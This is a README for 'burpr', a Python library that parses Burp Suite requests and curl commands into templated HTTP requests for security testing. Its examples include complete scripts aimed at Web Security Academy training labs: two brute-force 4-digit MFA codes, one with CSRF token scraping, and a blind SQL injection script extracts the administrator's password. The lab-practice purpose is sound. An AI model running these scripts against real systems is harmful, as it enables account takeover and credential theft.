# Burpr
[![CodeFactor](https://www.codefactor.io/repository/github/krystianbajno/burpr/badge)](https://www.codefactor.io/repository/github/krystianbajno/burpr)
[![Codacy Badge](https://app.codacy.com/project/badge/Grade/0bfcfae7a9de48e29f60dade3b0b7340)](https://app.codacy.com/gh/krystianbajno/burpr/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade)

# What is it
A Burp Suite request parser, used for aid in assessing application security functionality.

# Why I wrote it
To use captured requests programatically.

# Installation
```bash
pip install burpr
```

# Usage
Parse Burp requests from strings or files. Use the `.bind()` method to replace placeholder values.

```python
import burpr

# Parse from string
burp_request = '''GET /api/users HTTP/2
Host: example.com
Authorization: Bearer %TOKEN%

'''

req = burpr.parse_string(burp_request)
req.bind("%TOKEN%", "actual-token-value")

# Method 1: Using requests library
response = req.make_request()

# Method 2: Using httpx for HTTP/2 support
response = req.make_httpx_request()

# Method 3: Manual with any HTTP client
import httpx
client = httpx.Client(http2=req.is_http2)
response = client.request(
    method=req.method,
    url=req.url,
    headers=req.headers,
    content=req.body
)
```

# Features

## Comprehensive Parsing Support
```python
# Parse Burp Suite requests
req = burpr.parse_string(burp_request_string)
req = burpr.parse_file("request.txt")

# Parse curl commands
req = burpr.from_curl('curl -X POST https://api.com/data -d "key=%VALUE%"')

# Parse from Python requests
req = burpr.from_requests("POST", "https://api.com", json={"key": "%VALUE%"})

# Parse HTTP/2 requests
req = burpr.from_http2({
    ":method": "GET",
    ":path": "/users",
    ":authority": "api.example.com",
    ":scheme": "https"
})
```

## Placeholder System
```python
# Use %PLACEHOLDER% format for dynamic values
req.bind("%TOKEN%", "actual-token-value")
req.bind("%USER_ID%", "12345")

# Chain multiple bindings
req.bind("%HOST%", "prod.api.com") \
   .bind("%VERSION%", "v2") \
   .bind("%KEY%", "secret")
```

## Making Requests
```python
# Method 1: Direct execution with requests library
response = req.make_request()

# Method 2: Using httpx for HTTP/2 support
response = req.make_httpx_request()

# Method 3: Get prepared request for custom handling
prepared = req.to_request()  # returns requests.PreparedRequest
```

## Utility Functions
```python
# Clone a request
req2 = burpr.clone(req)

# Set Content-Length
burpr.prepare(req)

# Convert back to Burp format
burp_string = burpr.to_burp_format(req)
```

# Examples

## Brute Force Broken MFA
```python
import burpr
import httpx
import itertools

burp_request = r"""POST /login2 HTTP/2
Host: xxxx.web-security-academy.net
Cookie: verify=carlos; session=xxxx
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
Origin: https://xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xxxx.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

mfa-code=%MFA_CODE%
"""

def generate_pin_numbers():
    return [''.join(str(d) for d in combo) for combo in itertools.product(range(10), repeat=4)]

def brute_force_broken_mfa():
    # Parse base request
    base_req = burpr.parse_string(burp_request)
    
    # Create http client
    client = httpx.Client(http2=base_req.is_http2)
    
    for pin in generate_pin_numbers():
        # Clone and bind the PIN
        req = burpr.clone(base_req)
        req.bind("%MFA_CODE%", pin)
        burpr.prepare(req)
        
        # Send request
        res = client.request(
            method=req.method,
            url=req.url,
            headers=req.headers,
            content=req.body
        )
        
        print(res.status_code, pin)
        
        if res.status_code != 200:
            break

brute_force_broken_mfa()
```

## Brute Force Stricter Broken MFA
```python
import burpr
import httpx 
from bs4 import BeautifulSoup
import itertools

def generate_pin_numbers():
    return [''.join(str(d) for d in combo) for combo in itertools.product(range(10), repeat=4)]

def brute_force_stricter_broken_mfa():
    # Templates with placeholders
    login_get_template = '''GET /login HTTP/1.1
Host: xxxx.web-security-academy.net

'''
    
    login_post_template = '''POST /login HTTP/1.1
Host: xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: %SESSION%

csrf=%CSRF%&username=%USERNAME%&password=%PASSWORD%
'''
    
    mfa_get_template = '''GET /login2 HTTP/1.1
Host: xxxx.web-security-academy.net
Cookie: %SESSION%

'''
    
    mfa_post_template = '''POST /login2 HTTP/1.1
Host: xxxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: %SESSION%

csrf=%CSRF%&mfa-code=%MFA_CODE%
'''
    
    victim_login = "carlos"
    victim_pass = "montoya"
    
    client = httpx.Client()
    
    for pin in generate_pin_numbers():
        # Get CSRF token
        req = burpr.parse_string(login_get_template)
        res = client.request(req.method, req.url, headers=req.headers)
        
        soup = BeautifulSoup(res.text, "html.parser")
        csrf = soup.find(attrs={"name": "csrf"})["value"]
        session = res.cookies.get("session")
        
        # Login
        req = burpr.parse_string(login_post_template)
        req.bind("%SESSION%", f"session={session}")
        req.bind("%CSRF%", csrf)
        req.bind("%USERNAME%", victim_login)
        req.bind("%PASSWORD%", victim_pass)
        burpr.prepare(req)
        
        res = client.request(
            method=req.method,
            url=req.url,
            headers=req.headers,
            content=req.body
        )
        
        # Get MFA page
        session = res.cookies.get("session")
        req = burpr.parse_string(mfa_get_template)
        req.bind("%SESSION%", f"session={session}")
        
        res = client.request(req.method, req.url, headers=req.headers)
        soup = BeautifulSoup(res.text, "html.parser")
        csrf = soup.find(attrs={"name": "csrf"})["value"]
        
        # Try MFA code
        req = burpr.parse_string(mfa_post_template)
        req.bind("%SESSION%", f"session={session}")
        req.bind("%CSRF%", csrf)
        req.bind("%MFA_CODE%", pin)
        burpr.prepare(req)
        
        res = client.request(
            method=req.method,
            url=req.url,
            headers=req.headers,
            content=req.body
        )
        
        print(pin)
        
        if res.status_code != 200:
            print(res.status_code, pin, res.headers)
            break

brute_force_stricter_broken_mfa()
```

## Blind SQL Injection with Conditional Responses
```python
import burpr
import httpx
import sys

burp_request = '''GET /filter?category=Gifts HTTP/2
Host: xxxx.web-security-academy.net
Cookie: TrackingId=%TRACKING_ID%; session=aaaabbbbbcccccdddddd
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://xxxx.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

'''

alphabet = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_-+="
base_tracking = "aaaabbbbbcccccdddddd"

# Parse base request
base_req = burpr.parse_string(burp_request)
client = httpx.Client(http2=base_req.is_http2)

# Determine password length
length = 0
while length < 255:
    payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)={length + 1})='a"
    tracking_id = base_tracking + payload
    
    req = burpr.clone(base_req)
    req.bind("%TRACKING_ID%", tracking_id)
    
    res = client.request(req.method, req.url, headers=req.headers)
    
    length = length + 1
    
    if "Welcome back" in res.text:
        break

print(f"[*] Password length is {length}, retrieving password:")

# Retrieve password
for i in range(length):
    for letter in alphabet:
        payload = f"' AND (SELECT SUBSTRING(password,{i + 1},1) FROM users WHERE username='administrator')='{letter}"
        tracking_id = base_tracking + payload
        
        req = burpr.clone(base_req)
        req.bind("%TRACKING_ID%", tracking_id)
        
        res = client.request(req.method, req.url, headers=req.headers)
        
        if "Welcome back" in res.text:
            sys.stdout.write(letter)
            sys.stdout.flush()
            break
```

## Using curl Commands
```python
import burpr
import httpx

# Parse curl command with placeholders
curl_cmd = '''curl -X POST https://api.example.com/v2/authenticate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: %API_KEY%" \
  -d '{"username": "%USERNAME%", "password": "%PASSWORD%", "grant_type": "password"}'
'''

req = burpr.from_curl(curl_cmd)
req.bind("%API_KEY%", "sk-1234567890")
req.bind("%USERNAME%", "testuser")
req.bind("%PASSWORD%", "testpass123")

client = httpx.Client()
response = client.request(
    method=req.method,
    url=req.url,
    headers=req.headers,
    content=req.body
)
```

## Request Builder Pattern
```python
import burpr

# Create a template with multiple placeholders
api_template = '''%METHOD% %ENDPOINT% HTTP/1.1
Host: %HOST%
Authorization: Bearer %TOKEN%
Content-Type: %CONTENT_TYPE%
X-Request-ID: %REQUEST_ID%

%BODY%
'''

# Build different requests from the same template
def create_api_request(method, endpoint, body="", content_type="application/json"):
    req = burpr.parse_string(api_template)
    req.bind("%METHOD%", method)
    req.bind("%ENDPOINT%", endpoint)
    req.bind("%HOST%", "api.production.com")
    req.bind("%TOKEN%", get_current_token())
    req.bind("%CONTENT_TYPE%", content_type)
    req.bind("%REQUEST_ID%", generate_request_id())
    req.bind("%BODY%", body)
    
    burpr.prepare(req)
    return req

# Use it
req1 = create_api_request("GET", "/api/users")
req2 = create_api_request("POST", "/api/users", '{"name": "John"}')
req3 = create_api_request("DELETE", "/api/users/123")
```

# Testing

Run tests with pytest:
```bash
pytest tests/ -v
```

# License

MIT License